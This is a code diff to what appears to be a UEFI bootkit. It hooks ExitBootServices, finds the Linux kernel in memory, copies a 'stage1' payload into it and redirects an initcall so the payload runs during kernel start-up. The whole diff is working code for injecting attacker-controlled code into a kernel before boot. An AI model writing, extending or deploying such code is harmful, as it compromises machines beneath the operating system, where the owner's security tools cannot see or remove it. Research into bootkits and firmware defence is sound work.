@@ -4,6 +4,7 @@
  * */
 #include <efi.h>
 #include <efilib.h>
+#include "../stage1.h"
 
 // How far we want to go looking for the entrypoint.
 #define MAX_DEPTH 4096
@@ -20,6 +21,17 @@ int called = 0;
 int compare(char a, char b)
 {
     return a == b;
+}
+
+
+void *memcpy(void *dest, const void *src, int n)
+{
+    char *d = (char *)dest;
+    char *s = (char *)src;
+    for (int i = 0; i < n; i++) {
+        d[i] = s[i];
+    }
+    return dest;
 }
 
 
@@ -56,7 +68,11 @@ int check_address(void *addr)
 /* Apply our kernel patches */
 void apply_patch(void *addr)
 {
-
+    // Copy our payload in.
+    memcpy(addr + LOAD_OFFSET, stage1, stage1_len);
+    // Hook our target initcall.
+    UINT32 *target = addr + _initcall_offset;
+    *target = (UINT32) (LOAD_OFFSET - _initcall_offset);
 }
 
 
@@ -116,8 +132,13 @@ EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
         }
     }
 
-    // maybe look at setting up a runtime services to keep some code alive after
-    // this.
+    /* If we make it here, it seems the kernel was not found, which should only
+     * happen in pre 6.6 kernels as exitbootservices is called much earlier in
+     * those. 
+     *
+     * Probably gonna need to allocate runtime memory here.
+     */
+
 done:
     if (map != NULL) {
         bootservices->FreePool(&map);
